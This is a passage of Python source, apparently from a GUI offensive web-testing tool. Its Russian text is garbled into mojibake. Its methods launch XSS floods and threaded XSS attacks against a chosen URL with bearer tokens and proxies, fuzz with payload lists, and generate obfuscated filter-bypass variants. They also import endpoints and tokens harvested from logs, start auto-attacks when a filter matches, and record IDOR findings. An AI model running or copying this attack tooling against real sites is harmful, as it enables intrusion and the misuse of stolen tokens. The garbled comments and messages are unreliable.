            self.log("[‚ö†Ô∏è] –ù–µ–≤–µ—Ä–Ω—ã–π –∏–Ω—Ç–µ—Ä–≤–∞–ª, –∏—Å–ø–æ–ª—å–∑—É—é 1 —Å–µ–∫.")
            interval = 1.0

        self.success_count = 0
        self.log("[üöÄ] –ó–∞–ø—É—â–µ–Ω XSS Flood...")

        def flood_callback(url, status_code, content):
            if status_code == 200 and ("alert" in content.lower() or "confirm" in content.lower()):
                self.success_count += 1
                self.log(f"[‚úÖ] –£—Å–ø–µ—à–Ω–∞—è –∏–Ω—ä–µ–∫—Ü–∏—è #{self.success_count}: {url}")
            else:
                self.log(f"[üì°] –û—Ç–≤–µ—Ç {status_code} –æ—Ç {url}")

        threading.Thread(target=start_flood, kwargs={
            "flood_interval": interval,
            "flood_count": 50,
            "callback": flood_callback
        }, daemon=True).start()
    # ===== –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ —É—Å–ø–µ—à–Ω–æ–π –∞—Ç–∞–∫–∏ =====
    def save_success(self, url, payload):
        entry = {"url": url, "payload": payload, "time": str(datetime.datetime.now())}
        try:
            with open("successful_attacks.json", "a", encoding="utf-8") as f:
                f.write(json.dumps(entry) + "\n")
        except Exception as e:
            self.log(f"[–û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏] {e}")

    # ===== –ó–∞–ø—É—Å–∫ XSS-–∞—Ç–∞–∫–∏ =====
    def start_xss_attack(self):
        raw = self.api_combo.get().strip()
        token = self.token_combo.get().strip() if self.token_combo.get() != "‚Äî" else None
        method = self.method_combo.get().strip().upper()
        category = self.category_combo.get()
        try:
            interval = int(self.interval_entry.get())
        except ValueError:
            interval = 3

        # ‚úÖ –ò–∑–≤–ª–µ–∫–∞–µ–º URL –∏–∑ —Å–ª–æ–≤–∞—Ä—è –∏ –Ω–æ—Ä–º–∞–ª–∏–∑—É–µ–º —Å—Ö–µ–º—É
        try:
            endpoint = self._parse_endpoint(raw)
            url = endpoint["url"]
        except ValueError as e:
            self.log(f"[‚ùå] {e}")
            return

        try:
            timeout = float(self.timeout_spin.get())
        except Exception:
            timeout = CONFIG["network"]["default_timeout"]

        # === 4. –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–µ—Å—Å–∏–∏ ===
        session = create_retry_session(
            total=CONFIG["network"]["retry_total"],
            backoff=CONFIG["network"]["retry_backoff"],
            proxies=CONFIG["network"]["proxies"],
            timeout=timeout
        )
        self.attacker = XSSAttacker(
            url=url,
            method=method,
            token=token,
            category=category,
            interval=interval,
            timeout=timeout,
            rps=CONFIG["network"]["max_rps"],
            proxies=CONFIG["network"]["proxies"],
            on_log=self.log
        )
        self.attacker.start()
        self.log("üöÄ XSS-–∞—Ç–∞–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞")

    # ===== –û—Å—Ç–∞–Ω–æ–≤–∫–∞ XSS-–∞—Ç–∞–∫–∏ =====
    def stop_xss_attack(self):
        if self.attacker:
            self.attacker.stop()
            self.attacker = None
            self.log("üõë –ê—Ç–∞–∫–∞ –æ—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–∞")
        else:
            self.log("‚ö†Ô∏è –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω–æ–π –∞—Ç–∞–∫–∏")

    # ===== –ó–∞–ø—É—Å–∫ XSS-—Ñ—É–∑–∑–∏–Ω–≥–∞ =====
    def run_xss_fuzzing(self):
        # –ü—Ä–∏–º–µ—á–∞–Ω–∏–µ: –ø–µ—Ä–µ–º–µ—Å—Ç–∏—Ç–µ –∏–º–ø–æ—Ä—Ç—ã –≤ –Ω–∞—á–∞–ª–æ —Ñ–∞–π–ª–∞ (ast —É–∂–µ –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω)
        raw = self.api_combo.get().strip()
        if not raw or raw == "‚Äî":
            messagebox.showerror("–û—à–∏–±–∫–∞", "–£–∫–∞–∂–∏ —Ü–µ–ª–µ–≤–æ–π URL –¥–ª—è XSS-—Ñ—É–∑–∑–∏–Ω–≥–∞.")
            return

        try:
            endpoint = self._parse_endpoint(raw)
            url = endpoint["url"]
        except ValueError as e:
            messagebox.showerror("–û—à–∏–±–∫–∞", str(e))
            return

        method = self.method_combo.get().strip().upper()
        if method not in ("GET", "POST", "PUT", "PATCH", "DELETE", "HEAD", "OPTIONS"):
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–ù–µ–ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã–π HTTP-–º–µ—Ç–æ–¥: {method}")
            return

        try:
            timeout = float(self.timeout_spin.get())
        except Exception:
            timeout = CONFIG["network"]["default_timeout"]

        try:
            rate_limit = float(self.rate_spin.get())
        except Exception:
            rate_limit = CONFIG["network"]["max_rps"]

        # –ó–∞–≥–æ–ª–æ–≤–∫–∏: Content-Type –∏–º–µ–µ—Ç —Å–º—ã—Å–ª —Ç–æ–ª—å–∫–æ –¥–ª—è —Ç–µ–ª–µ—Å–æ–¥–µ—Ä–∂–∞—â–∏—Ö –º–µ—Ç–æ–¥–æ–≤
        headers = {}
        if method in ("POST", "PUT", "PATCH"):
            headers["Content-Type"] = "application/json"

        token = self.token_combo.get().strip()
        if token and token != "‚Äî":
            headers["Authorization"] = f"Bearer {token}"

        # –î–∞–ª—å—à–µ: –ø–æ–¥–≥–æ—Ç–æ–≤–∫–∞ payloads/base_targets/session –∏ –∑–∞–ø—É—Å–∫ –ø–æ—Ç–æ–∫–æ–≤
        # (—ç—Ç–æ—Ç –∫–æ–¥ –æ—Å—Ç–∞–≤–ª–µ–Ω –∑–∞ –ø—Ä–µ–¥–µ–ª–∞–º–∏ —Ñ—Ä–∞–≥–º–µ–Ω—Ç–∞; —É–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ:
        #  - session, sem, bucket, req_idx, req_idx_lock, user_agents, accepts –∏ —Ç.–¥. –æ–ø—Ä–µ–¥–µ–ª–µ–Ω—ã,
        #  - payloads –∏ base_targets –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ —Å—Ñ–æ—Ä–º–∏—Ä–æ–≤–∞–Ω—ã,
        #  - –≤—Å–µ –æ–ø–µ—Ä–∞—Ü–∏–∏ —Å req_idx –∑–∞—â–∏—â–µ–Ω—ã –æ–¥–Ω–∏–º –∏ —Ç–µ–º –∂–µ lock)

        # === 2. –ó–∞–≥—Ä—É–∑–∫–∞ –ø–µ–π–ª–æ–∞–¥–æ–≤ ===
        payloads = []
        payload_source = ""
        manual_text = self.payload_box.get("1.0", "end").strip()

        try:
            parsed = json.loads(manual_text)
            if isinstance(parsed, list):
                payloads = parsed
                payload_source = "—Ä—É—á–Ω–æ–π JSON (—Å–ø–∏—Å–æ–∫)"
            elif isinstance(parsed, dict):
                for key in ("payloads", "values"):
                    if isinstance(parsed.get(key), list):
                        payloads = parsed[key]
                        payload_source = f"—Ä—É—á–Ω–æ–π JSON ‚Üí {key}"
                        break
                if not payloads:
                    payloads = [parsed]
                    payload_source = "—Ä—É—á–Ω–æ–π JSON ‚Üí –æ–±—ä–µ–∫—Ç"
        except Exception as e:
            category = self.payload_combo.get()
            payloads = generate_payloads().get(category, [])
            payload_source = f"–∫–∞—Ç–µ–≥–æ—Ä–∏—è ¬´{category}¬ª"
            self.log(f"[‚ÑπÔ∏è] –ü–µ–π–ª–æ–∞–¥—ã –≤–∑—è—Ç—ã –∏–∑ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏, JSON –Ω–µ —Ä–∞—Å–ø–æ–∑–Ω–∞–Ω: {e}")

        if not payloads:
            messagebox.showerror("–û—à–∏–±–∫–∞", "–ù–µ—Ç –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –ø–µ–π–ª–æ–∞–¥–æ–≤.")
            return

        # === 3. –ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ –ª–æ–≥–æ–≤ ===
        os.makedirs("logs", exist_ok=True)
        ts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        out_dir = os.path.join("logs", f"xss_fuzz_{ts}")
        os.makedirs(out_dir, exist_ok=True)
        summary_path = os.path.join(out_dir, "summary.json")

        self.log(f"[üîç] –ó–∞–ø—É—Å–∫ XSS-—Ñ—É–∑–∑–∏–Ω–≥–∞ –Ω–∞ {url} ({method}), {len(payloads)} –ø–µ–π–ª–æ–∞–¥–æ–≤ –∏–∑ {payload_source}...")

        # === 4. –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Å–µ—Å—Å–∏–∏ –∏ –∞—Ç–∞–∫–µ—Ä–∞ ===
        session = create_retry_session(
            total=CONFIG["network"]["retry_total"],
            backoff=CONFIG["network"]["retry_backoff"],
            proxies=CONFIG["network"]["proxies"],
            timeout=timeout
        )

        self.attacker = XSSAttacker(
            url=url,
            method=method,
            token=token,
            category="",
            interval=1,
            timeout=timeout,
            rps=rate_limit if rate_limit > 0 else self.safety.max_rps,
            proxies=CONFIG["network"]["proxies"],
            on_log=self.log
        )
        self.attacker.start_custom_payloads(payloads)

        # === 5. –°–æ—Ö—Ä–∞–Ω–µ–Ω–∏–µ –±–∞–∑–æ–≤–æ–≥–æ –æ—Ç—á—ë—Ç–∞ ===
        try:
            with open(summary_path, "w", encoding="utf-8") as f:
                json.dump({
                    "url": url,
                    "method": method,
                    "headers": headers,
                    "payload_source": payload_source,
                    "payload_count": len(payloads),
                    "timeout": timeout,
                    "rate_limit": rate_limit,
                    "results": []
                }, f, ensure_ascii=False, indent=2)
            self.log(f"[üìÅ] –û—Ç—á—ë—Ç —Å–æ–∑–¥–∞–Ω: {summary_path}")
        except Exception as e:
            self.log(f"[‚ö†Ô∏è] –ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å summary.json: {e}")

        self.log(f"[‚úÖ] –§—É–∑–∑–∏–Ω–≥ –∑–∞–ø—É—â–µ–Ω, —Ä–µ–∑—É–ª—å—Ç–∞—Ç—ã –±—É–¥—É—Ç –ø–æ—è–≤–ª—è—Ç—å—Å—è –≤ –ª–æ–≥–∞—Ö.")

    # ===== –û—Å—Ç–∞–Ω–æ–≤–∫–∞ XSS-–∞—Ç–∞–∫–∏ (–¥—É–±–ª–∏–∫–∞—Ç - –∏—Å–ø–æ–ª—å–∑—É–π—Ç–µ stop_xss_attack) =====
    def stop_xss_attacks(self):
        """DEPRECATED: –ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ stop_xss_attack()"""
        return self.stop_xss_attack()

    # ===== –û—Ç–ø—Ä–∞–≤–∫–∞ API-–∑–∞–ø—Ä–æ—Å–∞ =====
    def send_api_request(self):
        raw = self.api_combo.get().strip()
        token = self.token_combo.get().strip()
        method = self.method_combo.get()
        payload = self.payload_box.get("1.0", "end").strip()

        if not raw or raw == "‚Äî":
            messagebox.showerror("–û—à–∏–±–∫–∞", "–£–∫–∞–∂–∏ API endpoint.")
            return

        # ‚úÖ –ë–µ–∑–æ–ø–∞—Å–Ω–æ–µ –∏–∑–≤–ª–µ—á–µ–Ω–∏–µ URL –∏–∑ —Å–ª–æ–≤–∞—Ä—è
        try:
            endpoint = self._parse_endpoint(raw)
            url = endpoint["url"]
        except ValueError as e:
            messagebox.showerror("–û—à–∏–±–∫–∞", str(e))
            return

        headers = {"Content-Type": "application/json"}
        if token:
            headers["Authorization"] = f"Bearer {token}"

        try:
            if method == "GET":
                response = requests.get(url, headers=headers, timeout=8)
            else:
                try:
                    json_data = json.loads(payload) if payload else {}
                except json.JSONDecodeError:
                    messagebox.showerror("–û—à–∏–±–∫–∞", "–ù–µ–≤–∞–ª–∏–¥–Ω—ã–π JSON payload.")
                    return
                response = requests.post(url, headers=headers, json=json_data, timeout=8)

            self.response_box.delete("1.0", "end")
            self.response_box.insert("end", f"üì° Status: {response.status_code}\n\n")

            try:
                parsed = response.json()
                self.response_box.insert("end", json.dumps(parsed, indent=2, ensure_ascii=False))
                self.response_box.insert("end", "\n\nüß† –ö–ª—é—á–∏ –≤–µ—Ä—Ö–Ω–µ–≥–æ —É—Ä–æ–≤–Ω—è:\n")
                for key in parsed.keys():
                    self.response_box.insert("end", f"  - {key}\n")
            except Exception:
                self.response_box.insert("end", response.text)

            self.log_attack(url, method, token, payload, response)

        except Exception as e:
            self.response_box.delete("1.0", "end")
            self.response_box.insert("end", f"‚ùå –û—à–∏–±–∫–∞: {str(e)}")

    # ===== –í—Å—Ç–∞–≤–∫–∞ –≤—ã–±—Ä–∞–Ω–Ω–æ–≥–æ Payload =====
    def insert_payload(self):
        sel = self.payload_combo.get()
        payloads = generate_payloads()
        if sel in payloads:
            self.payload_box.delete("1.0", "end")
            self.payload_box.insert("end", payloads[sel])
            self.log(f"[üì¶] –í—Å—Ç–∞–≤–ª–µ–Ω payload: {sel}")
        else:
            self.log("[‚ö†Ô∏è] Payload –Ω–µ –Ω–∞–π–¥–µ–Ω –≤ –±–∞–∑–µ")

    def insert_random_payload(self):
        category = self.category_combo.get()
        payload = get_random_payload(category)
        self.payload_box.delete("1.0", "end")
        self.payload_box.insert("end", payload)
        self.log(f"[üé≤] –°–ª—É—á–∞–π–Ω—ã–π payload –∏–∑ {category}")

    def save_custom_payload(self):
        category = self.category_combo.get()
        payload = self.custom_payload_entry.get().strip()
        if not payload:
            messagebox.showerror("–û—à–∏–±–∫–∞", "–ü–æ–ª–µ payload –ø—É—Å—Ç–æ–µ.")
            return

        try:
            with open(PAYLOAD_DB_PATH, "r", encoding="utf-8") as f:
                db = json.load(f)
            db.setdefault("categories", {}).setdefault(category, []).append(payload)
            with open(PAYLOAD_DB_PATH, "w", encoding="utf-8") as f:
                json.dump(db, f, indent=2, ensure_ascii=False)

            messagebox.showinfo("‚úÖ –°–æ—Ö—Ä–∞–Ω–µ–Ω–æ", f"Payload –¥–æ–±–∞–≤–ª–µ–Ω –≤ –∫–∞—Ç–µ–≥–æ—Ä–∏—é {category}")
            self.custom_payload_entry.delete(0, "end")
            self.update_payloads()
            self.log(f"[üíæ] –ù–æ–≤—ã–π payload —Å–æ—Ö—Ä–∞–Ω—ë–Ω –≤ {category}")
        except Exception as e:
            messagebox.showerror("–û—à–∏–±–∫–∞ –∑–∞–ø–∏—Å–∏", f"–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å: {e}")
            self.log(f"[‚ùå] –û—à–∏–±–∫–∞ —Å–æ—Ö—Ä–∞–Ω–µ–Ω–∏—è payload: {e}")


    # ===== –ü—Ä–æ—Å–º–æ—Ç—Ä –≤—Å–µ—Ö Payload‚Äô–æ–≤ –ø–æ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏ =====
    def show_all_payloads(self):
        category = self.category_combo.get()
        try:
            with open(PAYLOAD_DB_PATH, "r", encoding="utf-8") as f:
                db = json.load(f)
            payloads = db.get("categories", {}).get(category, [])
            if not payloads:
                messagebox.showinfo("‚ö†Ô∏è –ü—É—Å—Ç–æ", f"–ù–µ—Ç –ø–µ–π–ª–æ–∞–¥–æ–≤ –≤ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏: {category}")
                return
            self.payload_text.delete("1.0", "end")
            self.payload_text.insert("1.0", "\n".join(payloads))
            self.log(f"[üìÇ] –ó–∞–≥—Ä—É–∂–µ–Ω–æ {len(payloads)} payload‚Äô–æ–≤ –∏–∑ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏ {category}")
        except Exception as e:
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–ù–µ —É–¥–∞–ª–æ—Å—å –∑–∞–≥—Ä—É–∑–∏—Ç—å payload_db.json:\n{e}")
            self.log(f"[‚ùå] –û—à–∏–±–∫–∞ –∑–∞–≥—Ä—É–∑–∫–∏ –±–∞–∑—ã payload: {e}")

    def show_stats(self):
        stats = get_stats()
        self.response_box.delete("1.0", "end")
        self.response_box.insert("end", "üìä –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –±–∞–∑—ã Payload‚Äô–æ–≤:\n\n")
        for cat, count in stats.items():
            self.response_box.insert("end", f"üì¶ {cat}: {count} –ø–µ–π–ª–æ–∞–¥–æ–≤\n")
        self.log("[üìä] –°—Ç–∞—Ç–∏—Å—Ç–∏–∫–∞ –±–∞–∑—ã payload –æ–±–Ω–æ–≤–ª–µ–Ω–∞")

    def obfuscate_payload(self):
        selected = self.payload_box.get("1.0", "end").strip()
        if selected:
            variants = generate_variants(selected)
            self.response_box.delete("1.0", "end")
            self.response_box.insert("end", "üß¨ –í–∞—Ä–∏–∞–Ω—Ç—ã –æ–±—Ö–æ–¥–∞:\n\n")
            for i, v in enumerate(variants, 1):
                self.response_box.insert("end", f"{i:02d}. {v}\n")
            self.log(f"[üß¨] –°–≥–µ–Ω–µ—Ä–∏—Ä–æ–≤–∞–Ω–æ {len(variants)} –≤–∞—Ä–∏–∞–Ω—Ç–æ–≤ –¥–ª—è –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏")
        else:
            self.log("[‚ö†Ô∏è] –ù–µ—Ç –≤—ã–±—Ä–∞–Ω–Ω–æ–≥–æ payload –¥–ª—è –æ–±—Ñ—É—Å–∫–∞—Ü–∏–∏")

    # ===== –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ API-–∞—Ç–∞–∫–∏ =====
    def log_attack(self, url, method, token, payload, response):
        # TODO: os, json, datetime —É–∂–µ –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞–Ω—ã –≤ –Ω–∞—á–∞–ª–µ —Ñ–∞–π–ª–∞

        os.makedirs("logs", exist_ok=True)

        # –ì–∞—Ä–∞–Ω—Ç–∏—Ä—É–µ–º, —á—Ç–æ response –Ω–µ None
        status_code = getattr(response, "status_code", None)
        resp_text = getattr(response, "text", "")

        # –û–≥—Ä–∞–Ω–∏—á–µ–Ω–∏–µ –¥–ª–∏–Ω—ã response –≤ JSON (—á—Ç–æ–±—ã –ª–æ–≥ –Ω–µ –≤–∑—Ä—ã–≤–∞–ª—Å—è –Ω–∞ –±–æ–ª—å—à–∏—Ö HTML)
        MAX_LEN = self.safety.response_log_cap
        resp_preview = resp_text if len(resp_text) <= MAX_LEN else resp_text[
                                                                   :MAX_LEN] + f"\n...[–û–±—Ä–µ–∑–∞–Ω–æ {len(resp_text) - MAX_LEN} —Å–∏–º–≤–æ–ª–æ–≤]"

        log_entry = {
            "timestamp": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "url": url,
            "method": method,
            "token": token,
            "payload": payload,
            "status": status_code,
            "response": resp_preview
        }

        history_path = "logs/api_attack_history.json"
        try:
            history = []
            if os.path.exists(history_path):
                with open(history_path, encoding="utf-8") as f:
                    history = json.load(f)

            history.append(log_entry)

            with open(history_path, "w", encoding="utf-8") as f:
                json.dump(history, f, indent=2, ensure_ascii=False)

            if hasattr(self, "log"):
                self.log(f"[üìú] –õ–æ–≥ –∞—Ç–∞–∫–∏ –¥–æ–±–∞–≤–ª–µ–Ω: {url} ({method}) ‚Äî —Å—Ç–∞—Ç—É—Å {status_code}")
            else:
                print(f"[üìú] –õ–æ–≥ –∞—Ç–∞–∫–∏ –¥–æ–±–∞–≤–ª–µ–Ω: {url} ({method}) ‚Äî —Å—Ç–∞—Ç—É—Å {status_code}")

        except Exception as e:
            msg = f"[ExploitTab] ‚ùå –û—à–∏–±–∫–∞ –ª–æ–≥–∏—Ä–æ–≤–∞–Ω–∏—è: {e}"
            if hasattr(self, "log"):
                self.log(msg)
            else:
                print(msg)

    # ===== –ò–º–ø–æ—Ä—Ç –ª–æ–≥–æ–≤ API-–∞—Ç–∞–∫ =====
    def import_logs(self):
        log_path = "logs/api_attack.log"
        if not os.path.exists(log_path):
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–§–∞–π–ª –ª–æ–≥–æ–≤ –Ω–µ –Ω–∞–π–¥–µ–Ω: {log_path}")
            self.log("[‚ùå] –õ–æ–≥–∏ –Ω–µ –Ω–∞–π–¥–µ–Ω—ã")
            return

        try:
            results = extract_api_data(log_path)
        except Exception as e:
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–ù–µ —É–¥–∞–ª–æ—Å—å –∏–º–ø–æ—Ä—Ç–∏—Ä–æ–≤–∞—Ç—å –ª–æ–≥–∏:\n{e}")
            self.log(f"[‚ùå] –û—à–∏–±–∫–∞ –∏–º–ø–æ—Ä—Ç–∞ –ª–æ–≥–æ–≤: {e}")
            return

        self.api_list = results.get("api_endpoints", [])
        self.token_list = results.get("tokens", [])

        self.api_combo["values"] = self.api_list or ["‚Äî"]
        self.token_combo["values"] = self.token_list or ["‚Äî"]

        if self.api_list:
            self.api_combo.set(self.api_list[0])
        else:
            self.api_combo.set("‚Äî")

        if self.token_list:
            self.token_combo.set(self.token_list[0])
        else:
            self.token_combo.set("‚Äî")

        self.response_box.delete("1.0", "end")
        self.response_box.insert("end", "üì• –ò–º–ø–æ—Ä—Ç –∏–∑ –ª–æ–≥–æ–≤ –∑–∞–≤–µ—Ä—à—ë–Ω:\n\n")

        for key, items in results.items():
            count = len(items)
            preview = ""
            if count > 0:
                preview_items = [str(i) for i in items[:3]]
                preview = " ‚Üí " + ", ".join(preview_items)
                if count > 3:
                    preview += " ..."
            self.response_box.insert("end", f"üîπ {key}: {count} –Ω–∞–π–¥–µ–Ω–æ{preview}\n")

        self.log("[‚úÖ] –ò–º–ø–æ—Ä—Ç –ª–æ–≥–æ–≤ –∑–∞–≤–µ—Ä—à—ë–Ω —É—Å–ø–µ—à–Ω–æ.")

    # ===== –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ/—Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—è payload‚Äô–æ–≤ –ø–æ –∫–∞—Ç–µ–≥–æ—Ä–∏–∏ =====
    def update_payloads(self, event=None):
        category = self.category_combo.get()
        self.all_payloads = generate_payloads().get(category, [])
        self.payload_combo["values"] = self.all_payloads

    def filter_payloads(self, event=None):
        query = self.search_entry.get().lower()
        self.payload_combo.set("")
        filtered = [p for p in self.all_payloads if query in p.lower()]
        self.payload_combo["values"] = filtered

        if filtered:
            self.payload_combo.set(filtered[0])
            if self.auto_attack_var.get():
                self.launch_auto_attack(filtered)
        else:
            self.payload_combo.set("")

    def insert_filtered_payload(self, event=None):
        selection = self.payload_combo.get()
        if selection:
            self.payload_box.delete("1.0", "end")
            self.payload_box.insert("1.0", selection)

    def launch_auto_attack(self, payloads, log_func=None):
        """
        –ó–∞–ø—É—Å–∫–∞–µ—Ç –∞–≤—Ç–æ–∞—Ç–∞–∫—É –Ω–∞ –æ—Å–Ω–æ–≤–µ payloads.
        log_func –º–æ–∂–Ω–æ –ø–µ—Ä–µ–¥–∞—Ç—å –∏–∑–≤–Ω–µ (—Å–æ–≤–º–µ—Å—Ç–∏–º–æ—Å—Ç—å —Å –¥—Ä—É–≥–∏–º–∏ –≤—ã–∑–æ–≤–∞–º–∏).
        –í–æ–∑–≤—Ä–∞—â–∞–µ—Ç True –ø—Ä–∏ —É—Å–ø–µ—à–Ω–æ–º —Å—Ç–∞—Ä—Ç–µ, False –ø—Ä–∏ –æ—à–∏–±–∫–µ.
        """
        if not payloads or not self.api_combo.get():
            return False

        if self.attacker and getattr(self.attacker, "running", False):
            return False

        url = self.api_combo.get().strip()
        method = self.method_combo.get()
        token = self.token_combo.get().strip() or None
        try:
            interval = float(self.interval_entry.get())
        except Exception:
            interval = 3.0

        # –ò—Å–ø–æ–ª—å–∑—É–µ–º –ø–µ—Ä–µ–¥–∞–Ω–Ω—ã–π log_func –∏–ª–∏ –ª–æ–∫–∞–ª—å–Ω—É—é —Ä–µ–∞–ª–∏–∑–∞—Ü–∏—é
        if log_func is None:
            def log(msg):
                try:
                    self.response_box.insert("end", f"{msg}\n")
                    self.response_box.see("end")
                except Exception:
                    pass
        else:
            log = log_func

        # –ü—Ä–æ—Å—Ç–∞—è –≤–∞–ª–∏–¥–∞—Ü–∏—è payloads
        if not isinstance(payloads, (list, tuple)):
            payloads = [payloads]
        payloads = [p for p in payloads if isinstance(p, str) and p.strip()]

        try:
            self.attacker = XSSAttacker(
                url=url,
                method=method,
                token=token,
                category="",
                interval=interval,
                timeout=8,
                rps=self.safety.max_rps,
                proxies=self.safety.proxies,
                on_log=log
            )

            # –ó–∞–ø—É—Å–∫ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ, —á—Ç–æ–±—ã –Ω–µ –±–ª–æ–∫–∏—Ä–æ–≤–∞—Ç—å GUI
            import threading
            t = threading.Thread(target=self.attacker.start_custom_payloads, args=(payloads,), daemon=True)
            t.start()

            log("üöÄ –ê–≤—Ç–æ–∞—Ç–∞–∫–∞ –∑–∞–ø—É—â–µ–Ω–∞ –ø–æ —Ñ–∏–ª—å—Ç—Ä—É")
            return True

        except Exception as e:
            try:
                log(f"‚ùå –û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞ –∞–≤—Ç–æ–∞—Ç–∞–∫–∏: {e}")
            except Exception:
                pass
            return False

    # ===== –≠–∫—Å–ø–æ—Ä—Ç IDOR-—Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤ –≤ Markdown =====
    def export_idor_markdown(self):
        path = "logs/idor_test_results.json"
        if not os.path.exists(path):
            messagebox.showerror("–û—à–∏–±–∫–∞", "–§–∞–π–ª idor_test_results.json –Ω–µ –Ω–∞–π–¥–µ–Ω.")
            return

        try:
            with open(path, encoding="utf-8") as f:
                data = json.load(f)
        except Exception as e:
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–ù–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ—á–∏—Ç–∞—Ç—å —Ñ–∞–π–ª:\n{e}")
            return

        md_lines = [
            "# üß™ IDOR Test Results\n",
            f"_Total Entries: {len(data)}_\n",
            "",
            "| URL | Status | Sensitive | Bytes |",
            "|-----|--------|-----------|--------|"
        ]

        for entry in data:
            url = entry.get("url", "‚Äî").replace("|", "%7C")
            if len(url) > 140:
                url_display = url[:140] + "‚Ä¶"
            else:
                url_display = url

            status = entry.get("status", "‚Äî")
            sensitive = "‚ö†Ô∏è" if entry.get("sensitive") else "‚úÖ"
            length = entry.get("length", 0)

            md_lines.append(f"| `{url_display}` | `{status}` | {sensitive} | `{length}` |")

        md_text = "\n".join(md_lines)

        try:
            with open("logs/idor_report.md", "w", encoding="utf-8") as f:
                f.write(md_text)
            print(f"[IDOR] üìÑ –û—Ç—á—ë—Ç —Å–æ—Ö—Ä–∞–Ω—ë–Ω: logs/idor_report.md ‚Äî {len(data)} —Å—Ç—Ä–æ–∫")
            messagebox.showinfo("Markdown-–æ—Ç—á—ë—Ç —Å–æ–∑–¥–∞–Ω", "–§–∞–π–ª logs/idor_report.md —Å—Ñ–æ—Ä–º–∏—Ä–æ–≤–∞–Ω.")
        except Exception as e:
            messagebox.showerror("–û—à–∏–±–∫–∞", f"–ù–µ —É–¥–∞–ª–æ—Å—å —Å–æ—Ö—Ä–∞–Ω–∏—Ç—å Markdown:\n{e}")